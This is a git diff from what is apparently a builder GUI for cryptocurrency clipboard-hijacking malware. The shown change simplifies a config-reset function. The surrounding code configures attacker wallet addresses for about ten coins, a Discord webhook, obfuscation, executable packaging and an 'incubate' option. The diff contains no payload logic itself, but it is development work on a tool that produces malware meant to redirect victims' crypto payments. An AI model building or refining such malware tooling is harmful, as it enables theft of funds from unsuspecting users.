@@ -104,31 +104,9 @@ class toplevel:
         exit.pack()
 
 class resetconfig:
-    def reset(btc_addr, eth_addr, xmr_addr, bch_addr,
-              ltc_addr, sol_addr, doge_addr,
-              xrp_addr, trx_addr, webhook_url):
-        global icon_path
-
-        icon_path = ""
-
-        add_icon_btn.configure(text="add custom icon", command=lambda: buildgui.icon_add())
-        icon_temp_label.configure(image="", text="icon will appear here")
-        
-        set_config_btn.configure(text="set config", fg_color="green", hover_color="#063b00", state="normal", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, 
-                                                                                                                                                           btc_addr, eth_addr, xmr_addr, bch_addr,
-                                                                                                                                                           ltc_addr, sol_addr, doge_addr,
-                                                                                                                                                           xrp_addr, trx_addr, webhook_url))
-        config_set_lbl.configure(text="config not set", text_color="red")
-        check_valid_btn.configure(text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, bch_addr,
-                                                                                                                ltc_addr, sol_addr, doge_addr,
-                                                                                                                xrp_addr, trx_addr, webhook_url), state="normal")
-        exe_file_checkbox.deselect()
-        obfuscate_checkbox.deselect()
-        single_use_checkbox.deselect()
-        ping_discord_checkbox.deselect()
-        incubate_checkbox.deselect()
-        clipper_type.set("set clipper type")
-        buildclipperconfig.class_called = 0
+    def reset():
+        root.destroy()
+        buildgui.main()
 
 class build:
     def exe(current_path, new_file_name):
@@ -371,9 +349,7 @@ class buildclipperconfig:
             else:
                 buildclipperconfig.class_called += 1
                 config_set_lbl.configure(text="config set", text_color="green")
-                set_config_btn.configure(text="reset config", fg_color="red", hover_color="#8B0000", command=lambda: resetconfig.reset(btc_addr, eth_addr, xmr_addr, bch_addr,
-                                                                                                                                       ltc_addr, sol_addr, doge_addr,
-                                                                                                                                        xrp_addr, trx_addr, webhook_url))
+                set_config_btn.configure(text="reset config", fg_color="red", hover_color="#8B0000", command=lambda: resetconfig.reset())
 class buildgui:
     def check_addr_valid(btc_addr, eth_addr, xmr_addr,
                          ltc_addr, bch_addr, sol_addr, doge_addr,
